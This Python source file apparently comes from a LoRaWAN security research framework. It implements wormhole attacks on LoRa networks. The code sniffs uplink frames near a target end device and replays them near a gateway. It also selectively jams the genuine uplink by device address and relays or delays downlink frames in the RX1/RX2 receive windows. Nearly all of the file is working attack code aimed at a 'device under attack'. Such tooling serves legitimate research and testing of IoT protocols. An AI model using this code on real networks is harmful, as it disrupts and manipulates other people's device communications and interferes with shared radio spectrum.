import queue
import time
import threading
import traceback
from enum import Enum
from typing import Any, Callable, Dict, List, Tuple
from .helpers import calc_lora_airtime, seq_eq
from chirpotle.dissect.base import LoRaWANMessage, MType

# Frames with the same payload arriving withing 500ms are considered duplicates.
# This should also take care of removing the frames sent by the exit nodes.
DEDUP_THRESHOLD = 0.5

# We cannot import the TPy LoRa module here
LoRaModule = Any

# Type for callbacks
FrameListener = Callable[[List[int]], Any]

class LoRaWormhole:
  """
  Basic LoRa wormhole, which is agnostic of higher-layer protocols like LoRaWAN.

  Forwards all frames from all entry nodes to all exit nodes immediately after
  they have been receievd. The wormwhole is only one-way.
  """

  class NodeEventType(Enum):
    """
    Enum used to define the type of action that is send to the node handler
    threads
    """
    TRANSMIT = 1,
    STOP = 2,

  class NodeMeta:
    """
    Contains meta data and management data associated with a node
    """
    def __init__(self, node: LoRaModule):
      self.node = node
      self.queue = queue.Queue()

  def __init__(self, entry_nodes: List[LoRaModule],
      exit_nodes: List[LoRaModule]):
    self._entry_nodes : List[LoRaWormhole.NodeMeta] = \
      [LoRaWormhole.NodeMeta(l) for l in entry_nodes]
    self._exit_nodes : List[LoRaWormhole.NodeMeta] = \
      [LoRaWormhole.NodeMeta(l) for l in exit_nodes]
    self._channel = {
      'frequency'       : 868100000,
      'bandwidth'       : 125,
      'spreadingfactor' : 7,
      'syncword'        : 0x34,
      'codingrate'      : 5,
      'invertiqtx'      : False,
      'invertiqrx'      : False,
      'explicitheader'  : True
    }
    self._up = False
    self._listeners : List[FrameListener] = []
    # Deduplication of messages
    self._deduplicateLock = threading.Lock()
    # Last frames with their first TOA
    self._last_frames : List[Tuple[List[int], float]] = []

  def __del__(self):
    if self._up:
      self.down()

  @property
  def is_up(self) -> bool:
    return self._up

  @property
  def entryNodes(self) -> List[LoRaModule]:
    """
    Returns the list of entry nodes for the wormhole
    """
    return list(n.node for n in self._entry_nodes)

  @property
  def exitNodes(self) -> List[LoRaModule]:
    """
    Returns the list of exit nodes for the wormhole
    """
    return list(n.node for n in self._exit_nodes)

  def add_listener(self, listener: FrameListener):
    """
    Add a listener function to the wormhole.

    Listener functions get a copy of each message when it is forwarded by the
    wormhole.
    """
    if not listener in self._listeners:
      self._listeners.append(listener)

  def remove_listener(self, listener: FrameListener):
    """
    Disables a specific listener
    """
    if listener in self._listeners:
      self._listeners.remove(listener)

  def remove_all_listeners(self):
    """
    Disables all listeners
    """
    self._listeners=[]

  def _is_duplicate_msg(self, msg: Dict[str, Any]):
    """
    Assure that a single message isn't forwarded multiple times

    Returns true if the message is a duplicate
    """
    p = list(msg['payload'])
    with self._deduplicateLock:
      t = time.time()
      # Remove old frames from list
      self._last_frames = list(filter(
        lambda f: t-f[1] < DEDUP_THRESHOLD, self._last_frames
      ))
      # Check if this payload has been seen
      frame = next(filter(lambda f: f[0]==p, self._last_frames), None)
      if frame is not None:
        return True
      else:
        self._last_frames.append((p, t))
        return False

  def _forward(self, msg: Dict[str, Any]):
    """
    Forwards a message on the exit nodes.
    """
    if self._is_duplicate_msg(msg):
      return
    for node in self._exit_nodes:
      node.queue.put({
        "action": LoRaWormhole.NodeEventType.TRANSMIT,
        "data": msg['payload']
      })
    for listener in self._listeners:
      try:
        listener(msg['payload'])
      except:
        print("Error calling message listener")
        traceback.print_exc()

  def get_lora_channel(self) -> Dict[str, Any]:
    """
    Returns the current forwarding channel
    """
    return dict(self._channel)

  def set_lora_channel(self, **kwargs):
    """
    Configures the forwarding channel of the wormhole.

    The possible arguments are the same as for the LoRy module in TPy.

    Note invertiqtx is managed internally to match the polarity of forwarded
    frames (defined by invertiqrx)
    """
    for k in self._channel.keys():
      if k in kwargs:
        self._channel[k]=kwargs[k]
    self._channel['invertiqtx'] = not self._channel['invertiqrx']
    # Restart the wormhole to apply the changes
    was_up = self._up
    self.down()
    if was_up:
      self.up()

  def _start_entry_node(self, node_meta: NodeMeta):
    """
    Contains actions to start an entry node
    """
    node_meta.node.set_lora_channel(**self._channel)
    node_meta.node.receive()

  def _start_exit_node(self, node_meta: NodeMeta):
    """
    Contains actions to start an exit node
    """
    node_meta.node.set_lora_channel(**self._channel)

  def _stop_entry_node(self, node_meta: NodeMeta):
    """
    Contains actions to stop an entry node"
    """
    node_meta.node.standby()

  def _stop_exit_node(self, node_meta: NodeMeta):
    """
    Contains actions to stop an exit node
    """
    node_meta.node.standby()

  def _thread_entry_node(self, node_meta: NodeMeta):
    """
    Thread function that controls an entry node
    """
    try:
      self._start_entry_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        try:
          event = q.get(block=True, timeout=0.05)
          action = event['action']
          data = event['data'] if 'data' in event else None
          if action==LoRaWormhole.NodeEventType.TRANSMIT:
            # data is payload of message
            q.task_done()
            node.transmit_frame(data, blocking=True)
          elif action==LoRaWormhole.NodeEventType.STOP:
            self._stop_entry_node(node_meta)
            running = False
            q.task_done()
          else:
            print("Got unknown event type: %s" % action)
            q.task_done()
        except queue.Empty:
          pass
        msg = node.fetch_frame()
        if msg is not None:
          self._forward(msg)
    except:
      print("Entry node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def _thread_exit_node(self, node_meta: NodeMeta):
    """
    Thread function that controls an exit node
    """
    try:
      self._start_exit_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        event = q.get(block=True)
        action = event['action']
        data = event['data'] if 'data' in event else None
        if action==LoRaWormhole.NodeEventType.TRANSMIT:
          # data is payload of message
          q.task_done()
          node.transmit_frame(data)
        elif action==LoRaWormhole.NodeEventType.STOP:
          self._stop_exit_node(node_meta)
          running = False
          q.task_done()
        else:
          print("Got unknown event type: %s" % action)
          q.task_done()
    except:
      print("Exit node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def up(self):
    """
    Activates the wormhole. All messages from the entry nodes are forwarded
    to the exit nodes.
    """
    if self._up:
      return
    for node in self._exit_nodes:
      t = threading.Thread(target=self._thread_exit_node, args=[node])
      t.daemon = True
      t.start()
    for node in self._entry_nodes:
      t = threading.Thread(target=self._thread_entry_node, args=[node])
      t.daemon = True
      t.start()
    self._up = True

  def down(self):
    """
    Stops the wormhole. No more forwarding.
    """
    if not self._up:
      return
    self._down()

  def _down(self, calling_node: NodeMeta = None):
    """
    Internal function to stop the wormhole.

    Allows excluding a calling node so that a node thread can decide to stop the
    wormhole.
    """
    all_nodes = [
      node for node in self._entry_nodes + self._exit_nodes
      if node != calling_node
    ]
    for node in all_nodes:
      node.queue.put({
        "action": LoRaWormhole.NodeEventType.STOP
      })
    for node in all_nodes:
      node.queue.join()
    self._up = False


class Rx2Wormhole(LoRaWormhole):

  class FrameMeta:
    """
    Contains meta data for a frame, like the nodes that received it and the
    incoming timestamps
    """
    def __init__(self, entry_node: LoRaModule, ts: int, frame: dict):
      # The node that received this frame first, and will be used for
      # forwarding downlinke
      self.entry_node = entry_node
      # Timestamp of received uplink (local time of entry node)
      self.ts = ts
      # The frame information
      self.frame = frame
      # The time this object was created (to know when its outdated)
      self.ts_local = time.time()

  class Rx2NodeEventType(Enum):
    # Set a node to rx2 parameters to prepare it for transmitting a frame
    # Entry nodes only
    PREPARE_RX2 = 1,
    # Schedule a downlink frame
    # Must be called only on entry nodes, and only after PREPARE_RX2
    SCHEDULE_RX2 = 2,
    # Used to update the device address for the jammer. Data is the new address
    UPDATE_DEV_ADDR = 3,

  def __init__(
      self, entry_nodes: List[LoRaModule], exit_nodes: List[LoRaModule],
      rx1_delay: int = 1, dev_addr : List[int] = None):
    """
    Creates an instance of the Rx2Wormhole.

    The entry nodes have to be the nodes near the end device(s), the exit nodes
    are the ones near the gateway(s).

    Without setting a device address, all DATA_UP messages are forwarded through
    the wormhole, all DATA_DOWN messages are returned back.

    If a device address is set, only the messages from and to this device are
    considered.

    :param entry_nodes: Entry nodes of the wormhole (nodes near end device(s))
    :param exit_nodes:  Exit nodes of the wormhole (nodes near gateway(s))
    :param rx1_delay:   rx1 delay of the device/network under attack
    :param dev_addr:    Address of the device under attack in NETWORK BYTE ORDER
    """
    super().__init__(entry_nodes, exit_nodes)
    self._rx1_delay : int = rx1_delay
    self._rx2_delay : int = rx1_delay + 1
    self._pending_frames : List[Rx2Wormhole.FrameMeta] = []
    self._pending_frames_lock = threading.Lock()
    self._downlink_listeners : List[FrameListener] = []
    self._filters = []
    # Copy the uplink frame structure, but use reversed polarity
    self._rx2_channel = dict(self._channel)
    self._dev_addr = dev_addr

  def get_lora_channel_rx2(self):
    """
    Returns the rx2 channel of the network.
    """
    return dict(self._rx2_channel)

  def set_lora_channel_rx2(self, **kwargs):
    """
    Configures the rx2 forwarding parameters.

    The invertiq flags and explicitheader are managed internally
    """
    for k in self._rx2_channel.keys():
      if k in kwargs:
        self._rx2_channel[k]=kwargs[k]
    self._rx2_channel['invertiqrx'] = False
    self._rx2_channel['invertiqtx'] = False
    self._rx2_channel['explicitheader'] = True
    # Restarting isn't necessary as rx2 is only activated temporary

  def _start_entry_node(self, node_meta: LoRaWormhole.NodeMeta):
    # When transmitting, this node only transmits downlink frames, which do not
    # include a payload CRC on the phyical layer (Fig 5., Ch. 4 LoRaWAN
    # Specification 1.1) and which use inverted polarity.
    # To be able to sniff on the uplink frames, which are sent with normal
    # polarity, this is configured here as default, too.
    node_meta.node.standby()
    entry_channel = dict(self._channel)
    entry_channel['invertiqrx'] = False # Receeive uplinks
    entry_channel['invertiqtx'] = False # Transmit downlinks
    node_meta.node.set_txcrc(False)     # For tx, don't use PHY CRC
    node_meta.node.set_lora_channel(**entry_channel)
    node_meta.node.receive()

  def _thread_entry_node(self, node_meta: LoRaWormhole.NodeMeta):
    """
    Thread function that controls an entry node
    """
    try:
      self._start_entry_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        try:
          event = q.get(block=True, timeout=0.05)
          action = event['action']
          data = event['data'] if 'data' in event else None
          if action==LoRaWormhole.NodeEventType.TRANSMIT:
            # data is payload of message
            q.task_done()
            node.transmit_frame(data, blocking=True)
          elif action==Rx2Wormhole.Rx2NodeEventType.PREPARE_RX2:
            # Switch channel. Node is in standby after this.
            node.set_lora_channel(**self._rx2_channel)
            q.task_done()
            # Now, we wait for rx2Delay + 1 seconds for scheduling of a downlink
            downlinkTimeout = time.time() + self._rx2_delay + 1
            while downlinkTimeout > time.time():
              try:
                subevent = q.get(
                  block=True, timeout=max(0.001, downlinkTimeout - time.time()))
                q.task_done()
                if (subevent['action']
                    == Rx2Wormhole.Rx2NodeEventType.SCHEDULE_RX2):
                  node.transmit_frame(
                    subevent['data']['payload'],
                    sched_time=subevent['data']['ts'])
                elif (subevent['action']
                    == LoRaWormhole.NodeEventType.STOP):
                  # If we get a stop event in between, stop...
                  self._stop_entry_node(node_meta)
                  running = False
                  break
                else:
                  # Ignore other events, but at least print something to help
                  # debugging.
                  print("Unexpected event during rx2 scheduling")
              except queue.Empty:
                pass
            # Back to uplink listening
            uplink_channel = dict(self._channel)
            uplink_channel['invertiqrx'] = False
            uplink_channel['invertiqtx'] = False
            node.set_lora_channel(**uplink_channel)
            node.receive()
          elif action==LoRaWormhole.NodeEventType.STOP:
            self._stop_entry_node(node_meta)
            running = False
            q.task_done()
          else:
            print("Entry node got unexpected event type: %s" % action)
            q.task_done()
        except queue.Empty:
          pass
        msg = node.fetch_frame()
        if msg is not None:
          self._forward_uplink(msg, node_meta)
    except:
      print("Entry node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def _start_exit_node(self, node_meta: LoRaWormhole.NodeMeta):
    """
    Contains actions to start an exit node
    """
    # Go to standby to remove all previously configured actions
    node_meta.node.standby()
    # The exit node jams the regular uplink, so we put it into uplink receive
    # parameters at first:
    exit_channel = dict(self._channel)
    # Jammer triggered by uplink frames:
    exit_channel['invertiqrx'] = False
    # Use same polarity for jamming – The SX127x are a bit special here. "Inver-
    # ting" is meant w.r.t. the default uplink polarity, which is already
    # inverted for tx.
    exit_channel['invertiqtx'] = True
    node_meta.node.set_lora_channel(**exit_channel)
    # As the exit node only has to replay uplink frames, we enable payload CRC.
    # Otherwise, most forwarders ignore the frame. For jamming this makes no
    # difference.
    # See Fig. 5 in Ch. 4 of the LoRaWAN Specification 1.1 (LoRa PHY CRC only
    # on uplink frames)
    node_meta.node.set_txcrc(True)
    # Payload length not too long, otherwise the response would be interfered
    # with, too.
    node_meta.node.set_jammer_payload_length(
      13 - self._channel['spreadingfactor'])
    # We enable the jammer by default:
    self._update_jammer(node_meta.node, self._dev_addr)

  def _thread_exit_node(self, node_meta: LoRaWormhole.NodeMeta):
    try:
      self._start_exit_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        try:
          event = q.get(block=True, timeout=0.05)
          action = event['action']
          data = event['data'] if 'data' in event else None
          if action==LoRaWormhole.NodeEventType.TRANSMIT:
            # data is payload of message
            q.task_done()
            node.standby()
            node.transmit_frame(data, blocking=True)
            # The exit node now receives downlink -> reverse polarity for rx
            node.set_lora_channel(invertiqrx = True) # also disables the jammer
            node.receive() # receive rx1
            downlink_timeout = time.time() + self._rx1_delay + 1
            while downlink_timeout > time.time():
              # We ignore the queue during the waiting time and focus on getting
              # the frame back to the entry node quickly.
              frame = node.fetch_frame()
              if frame is not None:
                self._forward_downlink(frame)
            # Re-enable the jammer:
            node.set_lora_channel(invertiqrx = False)
            self._update_jammer(node_meta.node, self._dev_addr)

          elif action==LoRaWormhole.NodeEventType.STOP:
            try:
              self._stop_exit_node(node_meta)
            finally:
              running = False
              q.task_done()

          elif action==Rx2Wormhole.Rx2NodeEventType.UPDATE_DEV_ADDR:
            try:
              self._update_jammer(node_meta.node, data)
            finally:
              q.task_done()

          else:
            print("Exit node got unknown event type: %s" % action)

        except queue.Empty:
          pass
    except:
      print("Exit node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def _update_jammer(self, node: LoRaModule, dev_addr: List[int]):
    if dev_addr is not None:
      # 010 - Unconfirmed Data Up
      # 100 - Confirmed Data Up
      # -> We ignore MType
      pattern = [0x00] + dev_addr
      mask = [0x00, 0xff, 0xff, 0xff, 0xff]
      node.enable_sniffer(rxbuf = False, action="internal", mask=mask,
        pattern=pattern)
    else:
      node.standby()

  def _forward_uplink(self, msg: Dict[str, Any],
      receiver: LoRaWormhole.NodeMeta):
    # Forward as fast as possible
    if self._is_duplicate_msg(msg):
      return
    # Check that all filters are positive about this frame
    if any(not fltr(list(msg['payload'])) for fltr in self._filters):
      return
    for node in self._exit_nodes:
      node.queue.put({
        "action": LoRaWormhole.NodeEventType.TRANSMIT,
        "data": msg['payload']
      })
    with self._pending_frames_lock:
      self._pending_frames.append(Rx2Wormhole.FrameMeta(
        receiver, msg['time_rxdone'], list(msg['payload'])))
    # Prepare the receiver to run an rx2 downlink within the next rx2delay
    # seconds.
    receiver.queue.put({
      "action": Rx2Wormhole.Rx2NodeEventType.PREPARE_RX2
    })
    # Inform the listeners
    for listener in self._listeners:
      try:
        listener(msg['payload'])
      except:
        print("Error calling message listener")
        traceback.print_exc()

  def _forward_downlink(self, msg: Dict[str, Any]):
    # Get the payload and assure it has at least 5 bytes, as we compare by
    # device address
    payload = list(msg['payload'])
    if len('payload')<5:
      return
    devaddr = payload[1:5]
    t = time.time() + self._rx2_delay + 1
    # Check for a related entry in the pending frames
    frame_meta = next(
      filter(
        lambda m: m.frame[1:5]==devaddr and m.ts_local < t, self._pending_frames
      ), None
    )
    if frame_meta is not None:
      rx2_offset = frame_meta.ts + self._rx2_delay * 1000000 # µS
      # Schedule downlink on the entry node
      frame_meta.entry_node.queue.put({
        "action": Rx2Wormhole.Rx2NodeEventType.SCHEDULE_RX2,
        "data": {
          "ts": rx2_offset,
          "payload": payload
        }
      })
    # Inform the listeners
    for listener in self._downlink_listeners:
      try:
        listener(msg['payload'])
      except:
        print("Error calling downlink listener")
        traceback.print_exc()
    # Clean up the pending frames list
    with self._pending_frames_lock:
      self._pending_frames = list(filter(
        lambda m: m.ts_local < t and m.frame[1:5]!=devaddr, self._pending_frames
      ))

  def add_downlink_listener(self, listener: FrameListener):
    """
    Add a downlink listener function to the wormhole.

    Listener functions get a copy of each message when it is forwarded by the
    wormhole.
    """
    if not listener in self._downlink_listeners:
      self._downlink_listeners.append(listener)

  def remove_downlink_listener(self, listener: FrameListener):
    """
    Disables a specific downlink listener
    """
    if listener in self._downlink_listeners:
      self._downlink_listeners.remove(listener)

  def remove_all_listeners(self):
    """
    Disables all uplink/downlink listeners
    """
    super().remove_all_listeners()
    self._downlink_listeners=[]

  def add_filter(self, fltr):
    """
    Adds an uplink filter function to the wormhole.

    Filter functions get a copy of the frame's payload and must return a boolean
    value, either True if that frame should be forwarded, or False if it should
    be discarded. As this decision is made during the rx window period, the
    function must return quickly.
    """
    if not fltr in self._filters:
      self._filters.append(fltr)

  def remove_filter(self, fltr):
    """
    Removes a previously added filter
    """
    if fltr in self._filters:
      self._filters.remove(fltr)

  @property
  def dev_addr(self) -> List[int]:
    return list(self._dev_addr) if self._dev_addr is not None else None

  @dev_addr.setter
  def dev_addr(self, dev_addr: List[int]):
    """
    Configures the target device address for uplink that should be forwarded by
    the wormhole.

    The format is a list of bytes in NETWORK BYTE ORDER (meaning little endian)
    """
    if self._up:
      # Tell all exit nodes to update their jammer
      for node in self._exit_nodes:
        node.queue.put({
          "action": Rx2Wormhole.Rx2NodeEventType.UPDATE_DEV_ADDR,
          "data": dev_addr
        })
      # Wait for all exit nodes to apply the new settings
      for node in self._exit_nodes:
        node.queue.join()
    self._dev_addr = dev_addr

class DownlinkDelayedWormhole(Rx2Wormhole):

  class DownlinkDelayedNodeEventType(Enum):
    # Configure the exit node to capture the downlink
    AWAIT_DOWNLINK = 1,

  def __init__(
      self, entry_nodes: List[LoRaModule], exit_nodes: List[LoRaModule],
      rx1_delay: int = 1, dev_addr : List[int] = None):
    """
    Creates an instance of the DownlinkDelayedWormhole.

    The entry nodes have to be the nodes near the end device(s), the exit nodes
    are the ones near the gateway(s).

    :param entry_nodes: Entry nodes of the wormhole (nodes near end device(s))
    :param exit_nodes:  Exit nodes of the wormhole (nodes near gateway(s))
    :param rx1_delay:   rx1 delay of the device/network under attack
    :param dev_addr:    Address of the device under attack in NETWORK BYTE ORDER
    """
    super().__init__(entry_nodes, exit_nodes, rx1_delay, dev_addr)
    # Stores the pending downlink frame, if any.
    self._pending_dl = None
    self._last_fcnt_up = 0

  def _update_jammer(self, node: LoRaModule, dev_addr: List[int]):
    pattern = [0x00] + dev_addr
    mask = [0x00, 0xff, 0xff, 0xff, 0xff]
    node.set_lora_channel(invertiqrx = False, invertiqtx = True)
    node.set_jammer_payload_length(20 - self._channel['spreadingfactor'])
    node.enable_sniffer(rxbuf = False, action="internal", mask=mask,
      pattern=pattern)

  def _thread_entry_node(self, node_meta: LoRaWormhole.NodeMeta):
    """
    Thread function that controls an entry node
    """
    try:
      self._start_entry_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        try:
          event = q.get(block=True, timeout=0.05)
          action = event['action']
          data = event['data'] if 'data' in event else None
          if action==LoRaWormhole.NodeEventType.STOP:
            self._stop_entry_node(node_meta)
            running = False
            q.task_done()
          else:
            print("Entry node got unexpected event type: %s" % action)
            q.task_done()
        except queue.Empty:
          pass
        msg = node.fetch_frame()
        if msg is not None and len(msg['payload'])>=12:
          msg['parsed'] = LoRaWANMessage(msg['payload'])
          # Works only for unconfirmed uplink
          if (msg['parsed'].mhdr.data_up
              and seq_eq(msg['parsed'].payload.fhdr.devAddr, reversed(
                self._dev_addr))
              and msg['parsed'].payload.fhdr.fCnt != self._last_fcnt_up):
            if self._pending_dl is not None:
              dl = self._pending_dl
              self._pending_dl = None
              self._schedule_downlink(node_meta, msg, dl)
            # Forward the uplink after replaying a previously recorded downlink to
            # prevent coexistence issues.
            self._last_fcnt_up = msg['parsed'].payload.fhdr.fCnt
            self._forward_uplink(msg, node_meta)
    except:
      print("Entry node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def _thread_exit_node(self, node_meta: LoRaWormhole.NodeMeta):
    try:
      self._start_exit_node(node_meta)
      q = node_meta.queue
      node = node_meta.node
      running = True
      while running:
        try:
          event = q.get(block=True, timeout=0.05)
          action = event['action']
          data = event['data'] if 'data' in event else None
          if action==DownlinkDelayedWormhole.DownlinkDelayedNodeEventType.\
              AWAIT_DOWNLINK:
            q.task_done()
            # FIXME: Without this sleep, the node gets interrupted while
            # shutting of the jammer and gets unresponsive.
            time.sleep(0.5)
            node.standby()
            # tx: uplink, rx: downlink. Also stops the jammer.
            node.set_lora_channel(invertiqrx = True, invertiqtx = True)
            node.transmit_frame(data['payload'], blocking = True)
            node.receive() # receive rx1
            frame_time = calc_lora_airtime(
              30, # we assume a small payload here.
              spreadingfactor=self._channel['spreadingfactor'],
              bandwidth=self._channel['bandwidth'],
              codingrate=self._channel['codingrate'])
            downlink_timeout = time.time() + self._rx1_delay + \
              frame_time / 1000 + 1 # some additional delay for network latency
            while downlink_timeout > time.time():
              # We ignore the queue during the waiting time and focus on getting
              # the frame back to the entry node quickly.
              frame = node.fetch_frame()
              if (frame is not None and len(frame['payload']) >= 12 and
                  seq_eq(frame['payload'][1:5], self._dev_addr)):
                self._pending_dl = frame
                break
            # Re-enable the jammer:
            self._update_jammer(node_meta.node, self._dev_addr)
          elif action==LoRaWormhole.NodeEventType.STOP:
            try:
              self._stop_exit_node(node_meta)
            finally:
              running = False
              q.task_done()
          elif action==Rx2Wormhole.Rx2NodeEventType.UPDATE_DEV_ADDR:
            try:
              self._update_jammer(node_meta.node, data)
            finally:
              q.task_done()
          else:
            print("Exit node got unknown event type: %s" % action)
            q.task_done()
        except queue.Empty:
          pass
    except:
      print("Exit node got an error, shutting down.")
      traceback.print_exc()
      self._down(calling_node=node_meta)

  def _forward_uplink(self, msg: Dict[str, Any],
      receiver: LoRaWormhole.NodeMeta):
    # Forward as fast as possible
    if self._is_duplicate_msg(msg):
      return False
    # Check that all filters are positive about this frame
    if any(not fltr(list(msg['payload'])) for fltr in self._filters):
      return False
    if list(msg['payload'][1:5]) != self._dev_addr:
      return False
    for node in self._exit_nodes:
      node.queue.put({
        "action": DownlinkDelayedWormhole.DownlinkDelayedNodeEventType.\
          AWAIT_DOWNLINK,
        "data": msg,
      })
    for listener in self._listeners:
      try:
        listener(msg['payload'])
      except:
        print("Error calling message listener")
        traceback.print_exc()
    return True

  def _schedule_downlink(self, node_meta: LoRaWormhole.NodeMeta,
      msg_up: Dict[str, Any], msg_down: Dict[str, Any]):
    """
    Schedules a downlink in rx1 and sleeps until it is transmitted.

    (Waiting time is estimated assuming that the function was called at the
    beginning of the rx1 period)
    """
    node = node_meta.node
    t = msg_up['time_rxdone'] + self._rx1_delay * 1000000
    node.transmit_frame(msg_down['payload'], sched_time=t)
    airtime = calc_lora_airtime(
      len(msg_down['payload']),
      spreadingfactor=self._channel['spreadingfactor'],
      bandwidth=self._channel['bandwidth'],
      codingrate=self._channel['codingrate'])
    sleep_time = self._rx1_delay + (airtime / 1000)
    time.sleep(sleep_time)
    for listener in self._downlink_listeners:
      try:
        listener(msg_down['payload'])
      except:
        print("Error calling downlink listener")
        traceback.print_exc()
